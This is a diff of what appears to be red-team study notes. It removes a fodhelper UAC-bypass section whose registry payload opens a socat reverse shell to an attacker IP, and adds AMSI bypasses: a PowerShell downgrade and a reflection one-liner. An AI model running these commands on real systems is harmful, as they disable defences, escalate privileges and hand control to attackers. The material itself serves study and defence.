@@ -23,63 +23,43 @@ This is important to understand the complete model of AMSI, but we can break it 
 
 
 {% hint style="danger" %}
-if UAC is configured on the "Always Notify" level, fodhelper and similar apps won't be of any use as they will require the user to go through the UAC prompt to elevate.
+Note: AMSI is only instrumented when loaded from memory when executed from the CLR. It is assumed that if on disk MsMpEng.exe (Windows Defender) is already being instrumented.
 {% endhint %}
 
 ## Practice
 
-Microsoft doesn't consider UAC a security boundary but rather a simple convenience to the administrator to avoid unnecessarily running processes with administrative privileges. In that sense any bypass technique is not considered a vulnerability to Microsoft, and therefore some of them remain unpatched to this day.
+To find where AMSI is instrumented, we can use [InsecurePowerShell](https://github.com/cobbr/InsecurePowerShell) maintained by [Cobbr](https://github.com/cobbr) which is a GitHub fork of PowerShell with security feature removed, and compare it with an [offical PowerShell GitHub](https://github.com/PowerShell/PowerShell).
 
-### Using ProgID and AutoElevate binary to bypass UAC
-we will create an entry on the registry for a new progID of our choice (any name will do) and then point the CurVer entry in the ms-settings progID to our newly created progID. This way, when fodhelper tries opening a file using the ms-settings progID, it will notice the CurVer entry pointing to our new progID and check it to see what command to use.  
+### PowerShell Downgrade
+The PowerShell downgrade attack is a very low-hanging fruit that allows attackers to modify the current PowerShell version to remove security features.  
+Most PowerShell sessions will start with the most recent PowerShell engine, but attackers can manually change the version with a one-liner. By "downgrading" the PowerShell version to 2.0, you bypass security features since they were not implemented until version 5.0.
+
 {% tabs %}
 {% tab title="Powershell" %}
-The exploit code is proposed by [V3ded](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses)
+We can simply use this command to downgrad powershell. This attacked is used in popular tools such as [Unicorn](https://github.com/trustedsec/unicorn)
 ```bash
-$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
-
-New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
-Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
-    
-New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
-Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
-    
-Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+PowerShell -Version 2
 ```
+  
 {% hint style="danger" %}
-Detected by Windowds Defender
+Since this attack is such low-hanging fruit and simple in technique, there are a plethora of ways for the blue team to detect and mitigate this attack.
 {% endhint %}
 {% endtab %}
-
-{% tab title="CMD" %}
-V3ded exploit converted in CMD by TryHackMe
-```bash
-C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
-
-C:\> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
-The operation completed successfully.
-
-C:\> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
-The operation completed successfully.
-
-C:\> fodhelper.exe
-```  
-{% endtab %}
 {% endtabs %}  
 
-### Automated Exploitation
+### PowerShell Reflection
+Reflection allows a user or administrator to access and interact with .NET assemblies. It can be abused to modify and identify information from valuable DLLs.  
+The AMSI utilities for PowerShell are stored in the **AMSIUtils** .NET assembly located in **System.Management.Automation.AmsiUtils**.
+
 {% tabs %}
-{% tab title="UACME" %}
-While [UACME](https://github.com/hfiref0x/UACME) provides several tools, we will focus mainly on the one called **Akagi**, which runs the actual UAC bypasses  
-If you want to test for method 33, you can do the following from a command prompt, and a high integrity cmd.exe will pop up:
+{% tab title="Powershell" %}
+Matt Graeber published a one-liner to accomplish the goal of using Reflection to modify and bypass the AMSI utility. This one-line can be seen in the code block below.
 
 ```bash
-C:\tools>UACME-Akagi64.exe 33
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```  
 {% endtab %}
 {% endtabs %}  
-### Using ProgID and AutoElevate binary to bypass UAC
-we will create an entry on the registry for a new progID of our choice (any name will do) and then point the CurVer entry in the ms-settings progID to our newly created progID. This way, when fodhelper tries opening a file using the ms-settings progID, it will notice the CurVer entry pointing to our new progID and check it to see what command to use.
 
 ## References
 
